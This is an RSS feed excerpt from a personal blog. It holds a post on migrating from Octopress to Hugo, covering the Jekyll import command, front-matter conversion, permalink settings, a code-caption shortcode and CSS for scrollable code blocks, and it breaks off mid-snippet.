<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Parsia&#39;s Den</title>
    <link>http://parsiya.net/post/</link>
    <description>Recent content in Posts on Parsia&#39;s Den</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 02 Feb 2016 22:58:26 -0500</lastBuildDate>
    <atom:link href="http://parsiya.net/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>From Octopress to Hugo</title>
      <link>http://parsiya.net/blog/2016-02-02-From-Octopress-to-Hugo/</link>
      <pubDate>Tue, 02 Feb 2016 22:58:26 -0500</pubDate>
      
      <guid>http://parsiya.net/blog/2016-02-02-From-Octopress-to-Hugo/</guid>
      <description>

&lt;p&gt;In &lt;a href=&#34;http://parsiya.net/blog/2016-01-31-Why-Hugo/&#34; title=&#34;Why Hugo?&#34; target=&#34;_blank&#34;&gt;last post&lt;/a&gt; I talked about why I moved from Octopress to Hugo. In this post I am going to talk about how I managed the migration and any interesting things that I encountered in the process. I will also introduce the &lt;a href=&#34;https://github.com/parsiya/hugo-octopress/&#34; target=&#34;_blank&#34;&gt;Hugo-Octopress&lt;/a&gt; theme (you are looking at it), which is the classic Octopress theme ported to Hugo.&lt;/p&gt;

&lt;p&gt;You can also see the last archive of my Octopress blog (previously a private repo on Bitbucket) on github: &lt;a href=&#34;https://github.com/parsiya/Octopress-Blog&#34; target=&#34;_blank&#34;&gt;https://github.com/parsiya/Octopress-Blog&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&#34;hugo-import-jekyll:4451b754531b2eca1dcd74c8f975ea86&#34;&gt;hugo import jekyll&lt;/h3&gt;

&lt;p&gt;Hugo has an &lt;a href=&#34;https://gohugo.io/commands/hugo_import_jekyll/&#34; target=&#34;_blank&#34;&gt;Import from Jekyll&lt;/a&gt; feature. Octopress is also built on Jekyll but its directory structure is a bit different from Jekyll. Just running &lt;code&gt;hugo import jekyll&lt;/code&gt; in will not work. In Jekyll posts are usually stored in &lt;code&gt;jekyll-blog/posts/&lt;/code&gt; while in Octopress they are in &lt;code&gt;octopress-blog/source/_posts/&lt;/code&gt;. When importing from Octopress you have to point it to the &lt;code&gt;source&lt;/code&gt; directory like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;root&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;@debian&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;~/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;Desktop&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;octopress&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;blog&lt;/span&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# hugo import jekyll source/ hugo-import/&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Importing&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Congratulations!&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;posts&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;imported!&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Now,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;start&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Hugo&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;yourself:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;git&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;clone&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;https:&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;github&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;com&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;spf13&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;herring&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;cove&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;git&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hugo&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;import&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;themes&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;herring&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;cove&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;cd&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hugo&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;import&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hugo&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;server&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;w&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;--&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;theme&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;herring&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;cove&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Converted Markdown posts will be in &lt;code&gt;hugo-import/content/posts/&lt;/code&gt; and almost everything else will in &lt;code&gt;hugo-import/static/&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;# before conversion
---
layout: post
title: &amp;quot;Proxying Hipchat Part 3: SSL Added and Removed Here :^)&amp;quot;
date: 2015-10-19 21:42:10 -0400
comments: true
categories: [&amp;#39;Hipchat&amp;#39;,&amp;#39;Proxying&amp;#39;,&amp;#39;Burp&amp;#39;, &amp;#39;Python&amp;#39;]
---
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;# after conversion
---
categories:
- Hipchat
- Proxying
- Burp
- Python
comments: true
date: 2015-10-19T21:42:10Z
title: &amp;#39;Proxying Hipchat Part 3: SSL Added and Removed Here :^)&amp;#39;
url: /2015/10/19/proxying-hipchat-part-3-ssl-added-and-removed-here/
---
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The only thing I needed to remove was &lt;code&gt;url&lt;/code&gt; because I wanted my URLs to be similar to &lt;code&gt;/blog/2015-10-19-proxying-hipchat-part-3-ssl-added-and-removed-here/&lt;/code&gt;. This can be accomplished by adding the following to the config file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;[permalinks]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;post&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;/blog/:year-:month-:day-:title/&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I deleted almost everything else in the &lt;code&gt;static&lt;/code&gt; directory apart from the following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;images&lt;/code&gt; directory&lt;/li&gt;
&lt;li&gt;&lt;code&gt;favicon.png&lt;/code&gt;: because I wanted to keep the Octopress feel&lt;/li&gt;
&lt;li&gt;&lt;code&gt;stylesheets/screen.css&lt;/code&gt;: needed for porting the themes, although I moved it to &lt;code&gt;css\hugo-octopress.css&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Perhaps I did not use it properly, it is not built for Octopress anyways but the import process did not do much for me other than creating the basis for a new hugo blog (e.g. empty &lt;code&gt;layouts&lt;/code&gt; directory). I could have copied the Markdown files and use a bunch of &lt;code&gt;sed&lt;/code&gt; commands to replace the headers.&lt;/p&gt;

&lt;h3 id=&#34;shortcodes:4451b754531b2eca1dcd74c8f975ea86&#34;&gt;Shortcodes&lt;/h3&gt;

&lt;p&gt;I needed captions for images and codeblocks. Hugo does not have this by default but offers &lt;a href=&#34;https://gohugo.io/extras/shortcodes/&#34; target=&#34;_blank&#34;&gt;shortcodes&lt;/a&gt; which are very very simple create. Compared to plugin creation for Jekyll, Octopress or Pelican, it&amp;rsquo;s a walk in the park. I managed to create these two shortcodes in a few minutes. Granted Octopress and Jekyll already have these plugins.&lt;/p&gt;

&lt;h4 id=&#34;codecaption:4451b754531b2eca1dcd74c8f975ea86&#34;&gt;Codecaption&lt;/h4&gt;

&lt;p&gt;The codecaption block was quite simple. You can also see the result here.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;codecaption shortcode&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;figure&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;code&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;figcaption&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  	&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;span&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;{{ .Get &amp;quot;title&amp;quot; }}&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;span&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;figcaption&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;codewrapper&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
    {{ highlight .Inner (.Get &amp;quot;lang&amp;quot;) &amp;quot;linenos=true&amp;quot; }}
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;figure&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;The &lt;code&gt;highlight&lt;/code&gt; function in Hugo, passes everything between the opening and closing tags &lt;code&gt;.Inner&lt;/code&gt; to &lt;code&gt;pygments&lt;/code&gt; along with the language and an option to enable line numbers. The output of the &lt;code&gt;highlight&lt;/code&gt; function is a table with two rows:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;highlighttable&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;tbody&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;tr&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;td&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;linenodiv&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;background-color: #f0f0f0; padding-right: 10px&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
          &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;pre&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;line-height: 125%&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
             &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;!-- line numbers go here --&amp;gt;&lt;/span&gt;
          &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;pre&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;td&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;td&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;code&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;highlight&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;background: #002B36&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
          &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;pre&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;line-height: 125%&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
            &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;!-- highlighted code --&amp;gt;&lt;/span&gt;
          &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;pre&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;td&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;tr&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;tbody&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I needed to do something for when the code overflowed. By adding code-wrap in &lt;code&gt;css&lt;/code&gt;, line numbers and code would lose alignment. By adding &lt;code&gt;overflow-x: auto&lt;/code&gt; to the &lt;code&gt;highlight&lt;/code&gt; div, it would get a horizontal scrollbar but that would again mess with the alignment with line numbers.&lt;/p&gt;

&lt;p&gt;The solution was to wrap the whole table in a div and then give the div the following properties in css:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div.codewrapper&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #B58900&#34;&gt;overflow-x&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;auto&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #B58900&#34;&gt;overflow-y&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;hidden&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #B58900&#34;&gt;background-color&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;#002B36&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And that enables a horizontal scrollbar as you can see below:&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Normal backtick blocks are converted into something like the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;highlight&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;background: #002B36&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;pre&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;line-height: 125%&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;!-- highlighted code --&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;pre&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;To give them the same capability for overflow would mean that I had to modify the css for &lt;code&gt;div.highlight&lt;/code&gt;. But that interfered with the div.highlight in the codecaption output. Instead I used the following that only applies to div.highlights inside &lt;code&gt;div.entry-content&lt;/code&gt; (which contains the contents of each post):&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div.entry-content&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;div.highlight&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #B58900&#34;&gt;border-color&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;#002B36&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #B58900&#34;&gt;overflow-x&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;auto&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #B58900&#34;&gt;overflow-y&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;hidden&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #B58900&#34;&gt;margin-bottom&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0.4em&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Finally codecaption&amp;rsquo;s output is similar to this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;figure&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;code&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
